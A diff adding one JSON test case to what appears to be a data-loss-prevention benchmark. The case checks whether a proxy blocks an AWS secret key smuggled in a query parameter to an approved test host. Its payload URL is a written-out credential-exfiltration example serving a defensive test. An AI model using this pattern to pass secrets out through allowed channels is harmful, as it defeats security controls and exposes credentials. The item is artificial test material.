@@ -1,0 +1,21 @@
+{
+  "schema_version": 4,
+  "id": "url-dlp-allowed-api-query-018",
+  "category": "url",
+  "title": "AWS secret in a query parameter to an allowed API",
+  "description": "A request to an allowed API carries an AWS secret in an ordinary trace parameter. The destination is approved, so host allowlisting alone cannot stop the leak.",
+  "input_type": "url",
+  "transport": "http_proxy",
+  "payload": {
+    "method": "GET",
+    "url": "https://allowed-code-api.test/user/repos?trace=aws_secret_access_key%3DwJalrXUtnFEMI%2FK7MDENG%2FbPxRfiCYEXAMPLEKEY"
+  },
+  "expected_verdict": "block",
+  "severity": "critical",
+  "capability_tags": ["url_dlp"],
+  "requires": ["tls_interception", "url_dlp_scanning"],
+  "false_positive_risk": "medium",
+  "why_expected": "aws_secret_in_query_to_allowed_api",
+  "notes": "The benchmark-owned hostname resolves to a local HTTPS fixture. The companion case uses the same endpoint with a clean trace value; a destination-only block must fail that control. HTTPS interception is needed to inspect the query before forwarding.",
+  "source": "Synthetic allowed-channel exfiltration pattern"
+}
